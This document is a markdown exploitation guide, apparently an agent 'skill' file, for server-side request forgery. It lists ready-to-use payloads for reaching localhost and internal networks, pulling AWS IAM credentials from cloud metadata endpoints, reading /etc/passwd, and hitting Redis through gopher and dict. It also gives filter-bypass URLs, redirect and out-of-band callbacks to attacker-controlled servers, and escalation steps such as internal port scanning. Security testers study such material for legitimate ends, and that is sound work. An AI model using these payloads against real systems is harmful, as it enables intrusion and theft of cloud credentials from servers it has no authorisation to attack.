# SSRF Testing — Exploitation Skill

How to detect and exploit Server-Side Request Forgery:

## Step 1: Identify URL Parameters

Look for parameters that accept URLs or hostnames:
- `url=`, `uri=`, `path=`, `dest=`, `redirect=`
- `src=`, `source=`, `link=`, `href=`
- Webhook URLs, image fetching, import/export, PDF generation
- Any feature that "fetches" or "loads" from a URL

## Step 2: Establish Baseline

Send a normal URL and observe:
```
POST /fetch?url=http://example.com
→ Response: contents of example.com (server fetched it)
```

## Step 3: Test Internal Access

### Localhost
```
url=http://127.0.0.1/
url=http://localhost/
url=http://0.0.0.0/
url=http://[::1]/          (IPv6 localhost)
```

### Internal networks
```
url=http://192.168.1.1/
url=http://10.0.0.1/
url=http://172.16.0.1/
```

### Cloud metadata endpoints
```
# AWS
url=http://169.254.169.254/latest/meta-data/
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
url=http://metadata.google.internal/computeMetadata/v1/
(requires header: Metadata-Flavor: Google)

# Azure
url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
(requires header: Metadata: true)
```

## Step 4: Filter Bypass

### IP-based restrictions
```
url=http://0x7f000001/           (hex IP for 127.0.0.1)
url=http://2130706433/           (decimal IP for 127.0.0.1)
url=http://127.1/                (short form)
url=http://127.0.0.1.nip.io/    (DNS rebinding service)
```

### Protocol restrictions
```
url=file:///etc/passwd           (file protocol)
url=dict://127.0.0.1:6379/INFO  (Redis via dict protocol)
url=gopher://127.0.0.1:6379/... (arbitrary TCP via gopher)
```

### URL parsing confusion
```
url=http://evil.com@127.0.0.1/          (@ in URL)
url=http://127.0.0.1#@evil.com/         (fragment confusion)
url=http://127.0.0.1%2523@evil.com/     (double encoding)
```

### Redirect-based bypass
```
# If the server follows redirects:
url=http://your-server.com/redirect?to=http://127.0.0.1/
# Your server responds with 302 → http://127.0.0.1/
```

## Step 5: Detect Blind SSRF

If no response content is returned:

### Time-based
```
url=http://10.0.0.1:22/        (SSH — slow timeout = port open)
url=http://10.0.0.1:12345/     (fast timeout = port closed)
```

### Out-of-band
```
url=http://your-burp-collaborator.net/
url=http://your-interactsh-server/
→ If you receive a callback, the server made the request
```

## Step 6: Escalate

Once SSRF is confirmed:
1. **Port scan internal network**: Try common ports on internal IPs
2. **Access cloud metadata**: Extract IAM credentials, instance data
3. **Access internal services**: Redis, Elasticsearch, internal APIs
4. **Chain with other vulns**: SSRF + XXE, SSRF + deserialization
